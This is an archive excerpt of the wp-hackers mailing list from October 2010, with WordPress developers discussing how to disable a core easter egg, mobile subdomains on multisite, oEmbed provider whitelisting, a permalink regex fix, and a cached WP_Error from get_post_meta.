> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
> Beiler
> Sent: 22 October 2010 16:37
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> And that could be put in a plugin or wp-config.php according to
> webmaster
> preference.
>
> On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
>
> > Another way to do it, perhaps a better way, would be to have an easter
> egg
> > array that could be set on init.
> >
> > $eastereggs = array(
> > 'revself' => true,
> > 'wordpress' => true
> > )
> >
> > add_action('init','seteastereggs',0);
> > Function seteastereggs(){
> > $eastereggs['revself'] = false;
> > }
> >
> > On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
> >
> >> I'd like to see a more fleshed-out example of how that would work,
> but it
> >> makes logical sense so far :-)
> >>
> >> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
> >>
> >> >   - off
> >> >   - on
> >> >   - custom
> >> >   - file
> >> >
> >> > How is that? For custom, we would then use an array, or whatever it
> is
> >> that
> >> > would be in eastereggs.php, since some people probably want
> everything
> >> in
> >> > one file. For file, it would read eastereggs.php.
> >> >
> >> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
> >> >
> >> > > +1 For a setting in wp-config.
> >> > >
> >> > > define( 'EASTEREGGS', 'off' );
> >> > >
> >> > > Then maybe an "eastereggs.php" file we can drop in that defined
> which
> >> > ones
> >> > > we turn off.  That way it's not a wholesale all-off or all-on,
> but
> >> sites
> >> > > could pick and choose which ones they want to enable (for
> example, on
> >> > some
> >> > > sites I'd definitely want the capital P feature but not the post
> >> revision
> >> > > comparison message ... on others I might want to remove both ...
> on
> >> > others
> >> > > I
> >> > > might want to keep both and remove something else).
> >> > >
> >> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler
> <arlenbee at gmail.com>
> >> > wrote:
> >> > >
> >> > > > How many easter eggs are there. And I would recommend a setting
> in
> >> > > > wp-config.php, rather than a plugin.
> >> > > >
> >> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
> >> austin at ilfilosofo.com
> >> > > > >wrote:
> >> > > >
> >> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me>
> wrote:
> >> > > > > > As entertaining as the feature might be ... is there any
> way I
> >> can
> >> > > turn
> >> > > > > it
> >> > > > > > off on a client site?
> >> > > > >
> >> > > > > I proposed a patch here to allow it to be turned off by
> filter,
> >> but
> >> > > > > the ticket never went anywhere:
> >> > > > >
> >> > > > > <
> >> > > > >
> >> > > >
> >> > >
> >> >
> >>
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
> ons-filter.12816.2.diff
> >> > > > > >
> >> > > > > _______________________________________________
> >> > > > > wp-hackers mailing list
> >> > > > > wp-hackers at lists.automattic.com
> >> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > > > >
> >> > > > _______________________________________________
> >> > > > wp-hackers mailing list
> >> > > > wp-hackers at lists.automattic.com
> >> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > > >
> >> > > _______________________________________________
> >> > > wp-hackers mailing list
> >> > > wp-hackers at lists.automattic.com
> >> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > >
> >> > _______________________________________________
> >> > wp-hackers mailing list
> >> > wp-hackers at lists.automattic.com
> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jer at simianuprising.com  Fri Oct 22 15:54:40 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 22 Oct 2010 11:54:40 -0400
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTimgA1_eQCYZYBfvwRwMCTe3DxcHsSB9HFRcN6Yz@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
	<AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
	<AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>
	<AANLkTimgA1_eQCYZYBfvwRwMCTe3DxcHsSB9HFRcN6Yz@mail.gmail.com>
Message-ID: <AANLkTim23+PdPKXViH3kL0u=zZY0Rwx4FnbU-yE=N2+R@mail.gmail.com>

The *WordPress Mobile Edition* plugin lets you activate the mobile version
of the site with a URL parameter like /?cf_mobi=1 or something. Maybe you
could set up something in .htaccess to forward m.mysite.com to
mysite.com/?cf_mobi=1. At least with that particular plugin the result would
be that the user continues to see the mobile version as they click around,
so the fact that the "m." is gone from the url wouldn't be the end of the
world.

I mean, you should be mostly depending on user agent sniffing to decide when
to show the mobile version anyway, so the short url could be just a shortcut
rather than a whole other address.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From emoya at tribune.com  Fri Oct 22 16:09:03 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Fri, 22 Oct 2010 11:09:03 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTim71gzvunufV4OdP_K=ssv6MVFNKQXbzsOGZWCq@mail.gmail.com>
Message-ID: <C8E7214F.CFF7%emoya@tribune.com>

That almost sounds like you implied there was a "point" to having easter eggs. Ha!

In all seriousness though, as much as I think these easter eggs should not be in there at all. I'll submit to the things I know wont change any time soon.


 1.  There will be dumb annoying easter eggs.
 2.  They will be on by default.
 3.  It wont be made completely obvious to end-users that they exist.

That said, I think I agree that an admin console option would be confusing. Perhaps we could make this work in such a way that a plugin can be simply written to shut them all off. Ideally, as I have already said, it would be great if this could become a core plugin.

To add to some of the thinking that Arlen has been doing.. How about this....

Global $wp_easter_eggs;

$wp_easter_eggs = array(
'revself-matrix' => true,
'camel-case-p-filter' => true /* the name "wordpress seems a bit vague */
)

For simplicities sake it would be nice if you could also just do this to turn them all off at once.


$wp_easter_eggs = false;


For such a thing to work, I would suggest a standard way of checking if an easter egg is enabled or not.

Function wp_easter_egg_check($egg_name){
    global $wp_easter_eggs;
    if(empty($wp_easter_eggs)) return false;
    else return $wp_easter_egg[$egg_name];
}

Doing this in some way similar to this allows developers to nuke away all easter eggs easily, or target specific ones.

Hey, if you want to keep things obscure (you know.. For FUN!), you could name the change everything that says "easter_egg" to "dont_not_change"!  (not being serious, really, don't do that).

--
Eddie Moya
Applications Developer
Tribune Technology







As a standard check for if a particular


By having it as a global, it could be hooked into at any given point relative to whatever egg someone is trying to change.

On 10/22/10 10:43 AM, "Eric Mann" <eric at eam.me> wrote:

The admin console has enough options already ... besides, adding a visible
option would defeat the point of having an Easter egg in the first place and
add needless clutter with an option that "doesn't do anything" the user is
aware of.

On Fri, Oct 22, 2010 at 8:40 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> Or, another option in the Admin Console (though you risk the chance of
> the end-user, switching them on, and wondering why it doesn't do
> anything) ...
>
> G
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
> Beiler
> Sent: 22 October 2010 16:37
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> And that could be put in a plugin or wp-config.php according to
> webmaster
> preference.
>
> On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
>
> > Another way to do it, perhaps a better way, would be to have an easter
> egg
> > array that could be set on init.
> >
> > $eastereggs = array(
> > 'revself' => true,
> > 'wordpress' => true
> > )
> >
> > add_action('init','seteastereggs',0);
> > Function seteastereggs(){
> > $eastereggs['revself'] = false;
> > }
> >
> > On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
> >
> >> I'd like to see a more fleshed-out example of how that would work,
> but it
> >> makes logical sense so far :-)
> >>
> >> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
> >>
> >> >   - off
> >> >   - on
> >> >   - custom
> >> >   - file
> >> >
> >> > How is that? For custom, we would then use an array, or whatever it
> is
> >> that
> >> > would be in eastereggs.php, since some people probably want
> everything
> >> in
> >> > one file. For file, it would read eastereggs.php.
> >> >
> >> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
> >> >
> >> > > +1 For a setting in wp-config.
> >> > >
> >> > > define( 'EASTEREGGS', 'off' );
> >> > >
> >> > > Then maybe an "eastereggs.php" file we can drop in that defined
> which
> >> > ones
> >> > > we turn off.  That way it's not a wholesale all-off or all-on,
> but
> >> sites
> >> > > could pick and choose which ones they want to enable (for
> example, on
> >> > some
> >> > > sites I'd definitely want the capital P feature but not the post
> >> revision
> >> > > comparison message ... on others I might want to remove both ...
> on
> >> > others
> >> > > I
> >> > > might want to keep both and remove something else).
> >> > >
> >> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler
> <arlenbee at gmail.com>
> >> > wrote:
> >> > >
> >> > > > How many easter eggs are there. And I would recommend a setting
> in
> >> > > > wp-config.php, rather than a plugin.
> >> > > >
> >> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
> >> austin at ilfilosofo.com
> >> > > > >wrote:
> >> > > >
> >> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me>
> wrote:
> >> > > > > > As entertaining as the feature might be ... is there any
> way I
> >> can
> >> > > turn
> >> > > > > it
> >> > > > > > off on a client site?
> >> > > > >
> >> > > > > I proposed a patch here to allow it to be turned off by
> filter,
> >> but
> >> > > > > the ticket never went anywhere:
> >> > > > >
> >> > > > > <
> >> > > > >
> >> > > >
> >> > >
> >> >
> >>
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
> ons-filter.12816.2.diff
> >> > > > > >
> >> > > > > _______________________________________________
> >> > > > > wp-hackers mailing list
> >> > > > > wp-hackers at lists.automattic.com
> >> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > > > >
> >> > > > _______________________________________________
> >> > > > wp-hackers mailing list
> >> > > > wp-hackers at lists.automattic.com
> >> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > > >
> >> > > _______________________________________________
> >> > > wp-hackers mailing list
> >> > > wp-hackers at lists.automattic.com
> >> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > >
> >> > _______________________________________________
> >> > wp-hackers mailing list
> >> > wp-hackers at lists.automattic.com
> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From awgandrews at gmail.com  Fri Oct 22 16:10:15 2010
From: awgandrews at gmail.com (Alex Andrews)
Date: Fri, 22 Oct 2010 17:10:15 +0100
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTi=StNcfhAus-PdQmozkHrC3Y79ZJWFWPnar1Gwx@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
	<AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
	<AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
	<AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>
	<AANLkTi=StNcfhAus-PdQmozkHrC3Y79ZJWFWPnar1Gwx@mail.gmail.com>
Message-ID: <AANLkTikR-McTzfsQVuMTRstT70wtayniAqAovC-9qzTc@mail.gmail.com>

Get rid of it. Easter eggs are clever things which require user effort
to find and shouldn't interrupt normal functionality. Comparing a
revision with itself is time for an error message, not an Easter Egg
as comparison is a usual user operation. By all means, throw in an
easter egg when the user types certain key strokes, go nuts - but this
isn't the place.

Alex

On 22 October 2010 16:43, Arlen Beiler <arlenbee at gmail.com> wrote:
> In my opinion, something like this should not be in the admin panel. Like
> you said, it would create too much confusion and needless fumbling.
> WordPress is supposed to be simple, not complicated.
>
> On Fri, Oct 22, 2010 at 11:40 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:
>
>> Or, another option in the Admin Console (though you risk the chance of
>> the end-user, switching them on, and wondering why it doesn't do
>> anything) ...
>>
>> G
>>
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
>> Beiler
>> Sent: 22 October 2010 16:37
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>>
>> And that could be put in a plugin or wp-config.php according to
>> webmaster
>> preference.
>>
>> On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com>
>> wrote:
>>
>> > Another way to do it, perhaps a better way, would be to have an easter
>> egg
>> > array that could be set on init.
>> >
>> > $eastereggs = array(
>> > 'revself' => true,
>> > 'wordpress' => true
>> > )
>> >
>> > add_action('init','seteastereggs',0);
>> > Function seteastereggs(){
>> > $eastereggs['revself'] = false;
>> > }
>> >
>> > On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
>> >
>> >> I'd like to see a more fleshed-out example of how that would work,
>> but it
>> >> makes logical sense so far :-)
>> >>
>> >> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com>
>> wrote:
>> >>
>> >> > ? - off
>> >> > ? - on
>> >> > ? - custom
>> >> > ? - file
>> >> >
>> >> > How is that? For custom, we would then use an array, or whatever it
>> is
>> >> that
>> >> > would be in eastereggs.php, since some people probably want
>> everything
>> >> in
>> >> > one file. For file, it would read eastereggs.php.
>> >> >
>> >> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
>> >> >
>> >> > > +1 For a setting in wp-config.
>> >> > >
>> >> > > define( 'EASTEREGGS', 'off' );
>> >> > >
>> >> > > Then maybe an "eastereggs.php" file we can drop in that defined
>> which
>> >> > ones
>> >> > > we turn off. ?That way it's not a wholesale all-off or all-on,
>> but
>> >> sites
>> >> > > could pick and choose which ones they want to enable (for
>> example, on
>> >> > some
>> >> > > sites I'd definitely want the capital P feature but not the post
>> >> revision
>> >> > > comparison message ... on others I might want to remove both ...
>> on
>> >> > others
>> >> > > I
>> >> > > might want to keep both and remove something else).
>> >> > >
>> >> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler
>> <arlenbee at gmail.com>
>> >> > wrote:
>> >> > >
>> >> > > > How many easter eggs are there. And I would recommend a setting
>> in
>> >> > > > wp-config.php, rather than a plugin.
>> >> > > >
>> >> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
>> >> austin at ilfilosofo.com
>> >> > > > >wrote:
>> >> > > >
>> >> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me>
>> wrote:
>> >> > > > > > As entertaining as the feature might be ... is there any
>> way I
>> >> can
>> >> > > turn
>> >> > > > > it
>> >> > > > > > off on a client site?
>> >> > > > >
>> >> > > > > I proposed a patch here to allow it to be turned off by
>> filter,
>> >> but
>> >> > > > > the ticket never went anywhere:
>> >> > > > >
>> >> > > > > <
>> >> > > > >
>> >> > > >
>> >> > >
>> >> >
>> >>
>> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
>> ons-filter.12816.2.diff
>> >> > > > > >
>> >> > > > > _______________________________________________
>> >> > > > > wp-hackers mailing list
>> >> > > > > wp-hackers at lists.automattic.com
>> >> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> > > > >
>> >> > > > _______________________________________________
>> >> > > > wp-hackers mailing list
>> >> > > > wp-hackers at lists.automattic.com
>> >> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> > > >
>> >> > > _______________________________________________
>> >> > > wp-hackers mailing list
>> >> > > wp-hackers at lists.automattic.com
>> >> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> > >
>> >> > _______________________________________________
>> >> > wp-hackers mailing list
>> >> > wp-hackers at lists.automattic.com
>> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >> >
>> >> _______________________________________________
>> >> wp-hackers mailing list
>> >> wp-hackers at lists.automattic.com
>> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >>
>> >
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chris at clwill.com  Fri Oct 22 16:18:40 2010
From: chris at clwill.com (Chris Williams)
Date: Fri, 22 Oct 2010 12:18:40 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikR-McTzfsQVuMTRstT70wtayniAqAovC-9qzTc@mail.gmail.com>
Message-ID: <C8E70770.641B2%chris@clwill.com>

Easter eggs should be hard to find, and virtually impossible to "stumble upon".  If I have to disable them to prevent people from stumbling upon them, they're not a good egg.

You need to click on a hidden button, while holding down shift, control, and alt, then type "WP" to get to them...  The point is for it to be something that is leaked, and word about them is spread virally.

Cute is the enemy of professional, if WP wants to be treated seriously, it cannot be "cute".  Vis "Hello Dolly", but that's a whole different argument.

From davide.cerbo at exmachina.ch  Fri Oct 22 16:12:44 2010
From: davide.cerbo at exmachina.ch (Davide Cerbo)
Date: Fri, 22 Oct 2010 18:12:44 +0200
Subject: [wp-hackers] oEmbed or similar on wordpress-hosted blogs
Message-ID: <AANLkTikJYA=ChVRUcdSQ2z-BEz1LVDWF4RpqEdF-d9x8@mail.gmail.com>

Hi to everyone!

we have developed Snoopal, a document sharing service publicly available at
at www.snoopal.com.

we would like to be able to embed our own document viewer in blog posts on
wordpress-hosted blogs as it is for similar services such as YouTube,
Scribd, etc.). Also, we would encourage our user community to embed their
docs on Snoopal into their posts on wordpress-hosted blogs.

Snoopal is currently not listed in the white-list of media which can be
embedded into posts on wordpress-hosted blogs.

With this message I am kindly requesting whether it would be possible to add
Snoopal to the white-list of media which can be embedded in posts on
wordpress-hosted blogs.

Actually we already support oEmbed standard.

Please do not hesitate to contact me should you have any question or need
any additional information.

I hope that this is the right place for this question :)

thanks in advance,
Davide

From emoya at tribune.com  Fri Oct 22 16:21:30 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Fri, 22 Oct 2010 11:21:30 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8E70770.641B2%chris@clwill.com>
Message-ID: <C8E7243A.CFFE%emoya@tribune.com>

+1


On 10/22/10 11:18 AM, "Chris Williams" <chris at clwill.com> wrote:

Cute is the enemy of professional, if WP wants to be treated seriously, it cannot be "cute".  Vis "Hello Dolly", but that's a whole different argument.


Well said.


--
Eddie Moya
Applications Developer
Tribune Technology


From emoya at tribune.com  Fri Oct 22 16:25:30 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Fri, 22 Oct 2010 11:25:30 -0500
Subject: [wp-hackers] oEmbed or similar on wordpress-hosted blogs
In-Reply-To: <AANLkTikJYA=ChVRUcdSQ2z-BEz1LVDWF4RpqEdF-d9x8@mail.gmail.com>
Message-ID: <C8E7252A.D004%emoya@tribune.com>

The obvious easy step for you would be to create a plugin that adds you as an oembed provider.
http://codex.wordpress.org/Function_Reference/wp_oembed_add_provider


--
Eddie Moya
Applications Developer
Tribune Technology
emoya at tribune.com



On 10/22/10 11:12 AM, "Davide Cerbo" <davide.cerbo at exmachina.ch> wrote:

Hi to everyone!

we have developed Snoopal, a document sharing service publicly available at
at www.snoopal.com.

we would like to be able to embed our own document viewer in blog posts on
wordpress-hosted blogs as it is for similar services such as YouTube,
Scribd, etc.). Also, we would encourage our user community to embed their
docs on Snoopal into their posts on wordpress-hosted blogs.

Snoopal is currently not listed in the white-list of media which can be
embedded into posts on wordpress-hosted blogs.

With this message I am kindly requesting whether it would be possible to add
Snoopal to the white-list of media which can be embedded in posts on
wordpress-hosted blogs.

Actually we already support oEmbed standard.

Please do not hesitate to contact me should you have any question or need
any additional information.

I hope that this is the right place for this question :)

thanks in advance,
Davide
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From rbilesky at gmail.com  Fri Oct 22 17:46:10 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Fri, 22 Oct 2010 10:46:10 -0700
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTimv0hVOzkjTBZa4_x+=xS=iWtS27yOd0maHsE4-@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
	<AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
	<AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>
	<AANLkTin4ibHZN42+2ENqTHj3XSAKXW0=UOryht-PMa3J@mail.gmail.com>
	<AANLkTimv0hVOzkjTBZa4_x+=xS=iWtS27yOd0maHsE4-@mail.gmail.com>
Message-ID: <AANLkTi=nUMrJMqri2Y1eQhupi4=mL0jvewFzM05XJMS7@mail.gmail.com>

Great.  Seems to work as expected now on my install of wordpress so I am
going to generate a diff and attach it to the ticket.

On Fri, Oct 22, 2010 at 2:33 AM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 22, 2010 at 11:38 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > if ( preg_match("\A/%(?:postname|category|tag|author)%/",
> > $this->permalink_structure) )
> >
>
> You have to have a delimiter, preferably something different from '/' in
> this case:
>
> if ( preg_match("#\A/%(?:postname|category|tag|author)%#",
> $this->permalink_structure) )
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From rbilesky at gmail.com  Fri Oct 22 18:18:41 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Fri, 22 Oct 2010 11:18:41 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTim23+PdPKXViH3kL0u=zZY0Rwx4FnbU-yE=N2+R@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
	<AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>
	<AANLkTimA87fRbdo-owYH_58MXPZondgVOKm6EipzqK6W@mail.gmail.com>
	<AANLkTi=ULoi8U9SmoPDe1es9P8EqyNdKeODjQ-GAVYLX@mail.gmail.com>
	<AANLkTinKZa7v5Fm3cmyU7GzmzLwf8LD73DMdE5oBzcDf@mail.gmail.com>
	<AANLkTimgA1_eQCYZYBfvwRwMCTe3DxcHsSB9HFRcN6Yz@mail.gmail.com>
	<AANLkTim23+PdPKXViH3kL0u=zZY0Rwx4FnbU-yE=N2+R@mail.gmail.com>
Message-ID: <AANLkTimrOkZHgsshfzJ3vrUMcq3O5dYg=+BfwHN40RFX@mail.gmail.com>

Well all is good now, It only took killing a kitten by hacking core, but
that's ok because it was a bug one which has a trac ticket and I am doing to
create a diff file to attach to the ticket and hopefully my change will make
it in the next version.  Pages now work that verbose page rules aren't being
used.  Besides I think it really is going to be better having it as a
separate site for SEO, I can tell regular bots like googlebot not to index
the mobile site and tell mobile bots like googlebot-mobile not the index my
main site so I am not getting both sites indexed by the the same bot and
being penalized for duplicate content.

On Fri, Oct 22, 2010 at 8:54 AM, Jeremy Clarke <jer at simianuprising.com>wrote:

> The *WordPress Mobile Edition* plugin lets you activate the mobile version
> of the site with a URL parameter like /?cf_mobi=1 or something. Maybe you
> could set up something in .htaccess to forward m.mysite.com to
> mysite.com/?cf_mobi=1. At least with that particular plugin the result
> would
> be that the user continues to see the mobile version as they click around,
> so the fact that the "m." is gone from the url wouldn't be the end of the
> world.
>
> I mean, you should be mostly depending on user agent sniffing to decide
> when
> to show the mobile version anyway, so the short url could be just a
> shortcut
> rather than a whole other address.
>
> --
> Jeremy Clarke | http://jeremyclarke.org
> Code and Design | http://globalvoicesonline.org
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Fri Oct 22 18:26:01 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 22 Oct 2010 14:26:01 -0400
Subject: [wp-hackers] get_post_meta() returning a cached WP_Error?
Message-ID: <2FAE6681-B02A-4558-A2CF-3131FAC63745@newclarity.net>

Wanted to run this by you to see if I'm missing something.

I'm running this code and it is returning an WP_Error that has been cached (I traced through the code with XDEBUG so know that it got the error from the cache):

$menu_item_id = get_post_meta($post_id,'_microsite_page_menu_item_id',true);

Here is the var_dump() of that error:

object(WP_Error)#114 (2) {
  ["errors"]=>
  array(1) {
    ["update_nav_menu_item_failed"]=>
    array(1) {
      [0]=>
      string(47) "The given object ID is not that of a menu item."
    }
  }
  ["error_data"]=>
  array(0) {
  }
}

Should get_post_meta() be returning a cached WP_Error like this?  I'm passing single=true so shouldn't I just be getting an empty string?  Is this a bug for trac, or expected behavior? 

Thanks in advance for considering this.

-Mike

From hempsworth at gmail.com  Fri Oct 22 18:26:27 2010
From: hempsworth at gmail.com (Alexander Hempton-Smith)
Date: Fri, 22 Oct 2010 20:26:27 +0200
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTimrOkZHgsshfzJ3vrUMcq3O5dYg=+BfwHN40RFX@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
